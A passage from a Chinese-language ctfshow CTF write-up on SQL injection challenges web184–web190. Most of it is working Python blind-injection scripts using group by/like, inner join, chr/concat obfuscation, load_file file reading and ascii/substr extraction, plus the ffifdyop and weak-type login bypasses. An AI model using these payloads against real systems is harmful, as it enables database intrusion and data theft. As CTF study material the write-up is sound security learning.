</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(r.text)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;$user_count = 43;&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>target</span> <span class=o>+=</span> <span class=n>j</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>target</span><span class=p>)</span> <span class=o>==</span> <span class=mi>44</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>target</span> <span class=o>+</span> <span class=s1>&#39;}&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>为什么我没写左链接的脚本，因为我发现怎么写，他的回显都是一样的，没有区别无法完成盲注的任务，原因是什么呢？</p><ul><li>LEFT JOIN 实现了一个左表保留的操作，确保左表中的每一行至少出现在结果集中一次，无论右表中是否存在匹配行。如果没有找到匹配行，SQL 会用 NULL 值填充右表的列。GeeksforGeek +2 这种做法创建了一个可预测的基础，<strong>该基础在任何连接条件下都保持不变。</strong></li><li>相比之下，INNER JOIN 执行交集操作，结果集的大小会根据两个表之间实际匹配的数量而大幅变化。在 postgresql 中，结果集可以是零行（没有匹配）到笛卡尔积（每行多个匹配）。RIGHT JOIN 的行为类似于 LEFT JOIN，但在自连接场景中使用时会保留右表，从而在使用时产生类似的可变性。</li></ul><h2 id=web185>web185</h2><p>这题就比较复杂了，需要自增出true来表示数字，再利用<code>chr</code>和<code>concat</code>来表示字符串，不过注入还是用的<code>group by</code>和<code>like</code>通配符来打的，写个脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://50a0761d-8695-48df-bfe5-9410e5169332.challenge.ctf.show/select-waf.php&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;ctfshow_user group by pass having pass like(concat(</span><span class=si>{}</span><span class=s1>))&#39;</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s1>&#39;ctfshow{&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>createNum</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>num</span> <span class=o>=</span> <span class=s1>&#39;true&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>n</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;true&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span> <span class=o>-</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>num</span> <span class=o>+=</span> <span class=s2>&#34;+true&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>num</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>createStrNum</span><span class=p>(</span><span class=n>c</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>str</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nb>str</span> <span class=o>+=</span> <span class=s1>&#39;chr(&#39;</span> <span class=o>+</span> <span class=n>createNum</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>c</span><span class=p>[</span><span class=mi>0</span><span class=p>]))</span> <span class=o>+</span> <span class=s1>&#39;)&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>c</span><span class=p>[</span><span class=mi>1</span><span class=p>:]:</span>
</span></span><span class=line><span class=cl>        <span class=nb>str</span> <span class=o>+=</span> <span class=s1>&#39;,chr(&#39;</span> <span class=o>+</span> <span class=n>createNum</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>i</span><span class=p>))</span> <span class=o>+</span> <span class=s1>&#39;)&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>str</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>uuid</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;-</span><span class=si>{}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>50</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=n>uuid</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>poc</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>createStrNum</span><span class=p>(</span><span class=n>target</span> <span class=o>+</span> <span class=n>j</span> <span class=o>+</span> <span class=s2>&#34;%&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(poc)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;tableName&#39;</span><span class=p>:</span> <span class=n>poc</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;$user_count = 0;&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>target</span> <span class=o>+=</span> <span class=n>j</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>j</span> <span class=o>==</span> <span class=s1>&#39;}&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web186>web186</h2><p>内连接，绕过还是一样绕</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://50a0761d-8695-48df-bfe5-9410e5169332.challenge.ctf.show/select-waf.php&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;ctfshow_user a inner join ctfshow_user b on b.pass like(concat(</span><span class=si>{}</span><span class=s1>))&#39;</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s1>&#39;ctfshow{&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>createNum</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>num</span> <span class=o>=</span> <span class=s1>&#39;true&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>n</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;true&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span> <span class=o>-</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>num</span> <span class=o>+=</span> <span class=s2>&#34;+true&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>num</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>createStrNum</span><span class=p>(</span><span class=n>c</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>str</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nb>str</span> <span class=o>+=</span> <span class=s1>&#39;chr(&#39;</span> <span class=o>+</span> <span class=n>createNum</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>c</span><span class=p>[</span><span class=mi>0</span><span class=p>]))</span> <span class=o>+</span> <span class=s1>&#39;)&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>c</span><span class=p>[</span><span class=mi>1</span><span class=p>:]:</span>
</span></span><span class=line><span class=cl>        <span class=nb>str</span> <span class=o>+=</span> <span class=s1>&#39;,chr(&#39;</span> <span class=o>+</span> <span class=n>createNum</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>i</span><span class=p>))</span> <span class=o>+</span> <span class=s1>&#39;)&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>str</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>uuid</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;-</span><span class=si>{}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>50</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=n>uuid</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>poc</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>createStrNum</span><span class=p>(</span><span class=n>target</span> <span class=o>+</span> <span class=n>j</span> <span class=o>+</span> <span class=s2>&#34;%&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(poc)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;tableName&#39;</span><span class=p>:</span> <span class=n>poc</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;$user_count = 0;&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>target</span> <span class=o>+=</span> <span class=n>j</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>j</span> <span class=o>==</span> <span class=s1>&#39;}&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web187>web187</h2><p><img src=/p/ctfshow-sql-injection/QQ20250430-125528.jpg width=1001 height=471 loading=lazy alt=1></p><p>这不就把<code>'</code>变出来了<code>ffifdyop</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ctfshow_user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;admin&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>password</span><span class=o>=</span><span class=w> </span><span class=s1>&#39;&#39;</span><span class=k>or</span><span class=s1>&#39;6�]��!r,��b&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h2 id=web188>web188</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;pass&#39;</span><span class=p>]</span><span class=o>==</span><span class=nx>intval</span><span class=p>(</span><span class=nv>$password</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;msg&#39;</span><span class=p>]</span><span class=o>=</span><span class=s1>&#39;登陆成功&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>array_push</span><span class=p>(</span><span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>],</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=o>=&gt;</span><span class=nv>$flag</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>弱类型转换，一般id为0或者1的用户为admin，密码fuzz一下是0</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/api/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>bb3afd2b-ab85-40c7-aad1-7804d184482a.challenge.ctf.show</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>21</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Platform</span><span class=o>:</span> <span class=l>&#34;Windows&#34;</span>
</span></span><span class=line><span class=cl><span class=n>X-Requested-With</span><span class=o>:</span> <span class=l>XMLHttpRequest</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json, text/javascript, */*; q=0.01</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua</span><span class=o>:</span> <span class=l>&#34;Google Chrome&#34;;v=&#34;135&#34;, &#34;Not-A.Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;135&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded; charset=UTF-8</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Mobile</span><span class=o>:</span> <span class=l>?0</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>https://bb3afd2b-ab85-40c7-aad1-7804d184482a.challenge.ctf.show</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>same-origin</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>cors</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>empty</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>https://bb3afd2b-ab85-40c7-aad1-7804d184482a.challenge.ctf.show/select-waf.php</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Priority</span><span class=o>:</span> <span class=l>u=1, i</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>username=0&amp;password=0
</span></span></code></pre></td></tr></table></div></div><h2 id=web189>web189</h2><p>利用<code>load_file</code>进行盲注，因为我们是找flag，所以直接正则匹配，写个脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://b412e013-0ef3-4426-a54b-c77bc2ff1648.challenge.ctf.show/api/&#39;</span>
</span></span><span class=line><span class=cl><span class=n>uuid</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span><span class=o>+</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span><span class=o>+</span><span class=s2>&#34;-}&#34;</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s1>&#39;ctfshow{&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>50</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>uuid</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;if((load_file(&#39;/var/www/html/api/index.php&#39;)regexp(&#39;</span><span class=si>{0}</span><span class=s2>&#39;)),1,0)&#34;</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(char)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;username&#39;</span> <span class=p>:</span> <span class=n>payload</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>target</span><span class=o>+</span><span class=n>char</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;password&#39;</span> <span class=p>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>u67e5</span><span class=se>\\</span><span class=s2>u8be2</span><span class=se>\\</span><span class=s2>u5931</span><span class=se>\\</span><span class=s2>u8d25&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>target</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>char</span> <span class=o>==</span> <span class=s2>&#34;}&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>写了一会，发现url没换，绷不住了</p><h2 id=web190>web190</h2><p>Sql语句直接对参数进行拼接，直接打盲注，写Sql语句注意括号</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://65067a4c-0f8b-4d9d-89ea-dc1ab6362ee3.challenge.ctf.show/api/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>i</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span><span class=o>=</span><span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span><span class=o>=</span><span class=mi>127</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>head</span><span class=o>+</span><span class=mi>1</span> <span class=o>&lt;</span><span class=n>tail</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span><span class=o>=</span><span class=p>(</span><span class=n>tail</span><span class=o>+</span><span class=n>head</span><span class=p>)</span><span class=o>//</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload=&#34;admin&#39;and (ascii(substr((select database()),{0},1))&lt;{1})#&#34;.format(i,mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_web</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;admin&#39;and (ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#39;ctfshow_web&#39;),{0},1))&lt;{1})#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_fl0g,ctfshow_user</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;admin&#39;and (ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;),{0},1))&lt;{1})#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># id, f1ag</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;admin&#39;and (ascii(substr((select f1ag from ctfshow_fl0g),</span><span class=si>{0}</span><span class=s2>,1))&lt;</span><span class=si>{1}</span><span class=s2>)#&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span>
